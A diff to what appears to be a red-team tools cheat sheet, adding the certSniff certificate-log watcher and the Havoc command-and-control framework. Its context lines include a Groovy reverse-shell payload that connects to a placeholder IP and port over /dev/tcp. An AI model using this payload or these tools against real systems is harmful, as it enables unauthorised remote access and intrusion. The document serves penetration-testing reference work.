@@ -8,6 +8,7 @@
 1. [Reconnaissance](#reconnaissance)
     - crt.sh -> httprobe -> EyeWitness
     - nuclei
+    - certSniff
     - gobuster
     - dnsrecon
     - Shodan.io
@@ -45,7 +46,7 @@
 11. [Collection](#collection)
     - .
 12. [Command and Control](#command-and-control)
-    - .
+    - Havoc
 13. [Exfiltration](#exfiltration)
     - .
 14. [Impact](#impact)
@@ -80,6 +81,18 @@ Reconnaissance
 	**Use:** `cat domains.txt | nuclei -t /PATH/nuclei-templates/`
 	
 	![image](https://user-images.githubusercontent.com/100603074/205439027-2afe4ef8-fc7a-410d-934f-f8d325a8176e.png)
+
+* [certSniff](https://github.com/A-poc/certSniff)
+
+	certSniff is a Certificate Transparency logs keyword watcher I wrote in Python. It uses the certstream library to watch for certificate creation logs that contain keywords, defined in a file.
+	
+	You can set this running with several keywords relating to your victim domain, any certificate creations will be recorded and may lead to the discovery of domains you were previously unaware of.
+	
+	`git clone https://github.com/A-poc/certSniff;cd certSniff/;pip install -r requirements.txt`
+	
+	`python3 certSniff.py -f example.txt`
+	
+	![image](https://user-images.githubusercontent.com/100603074/206023792-ef251912-00c0-48e1-8691-71438cf7dd11.png)
 
 
 * [gobuster](https://www.kali.org/tools/gobuster/)
@@ -303,3 +316,15 @@ Lateral Movement
 	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/IP_ADDRESS/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 	p.waitFor()
 	```
+	
+Command and Control
+====================
+
+* [Havoc](https://github.com/HavocFramework/Havoc)
+	
+	Havoc is a modern and malleable post-exploitation command and control framework, created by [@C5pider](https://twitter.com/C5pider).
+	
+	Features include: Sleep Obfuscation, x64 return address spoofing, Indirect Syscalls for Nt* APIs
+	
+	![image](https://user-images.githubusercontent.com/100603074/206025215-9c7093e5-b45a-4755-81e6-9e2a52a1f455.png)
+
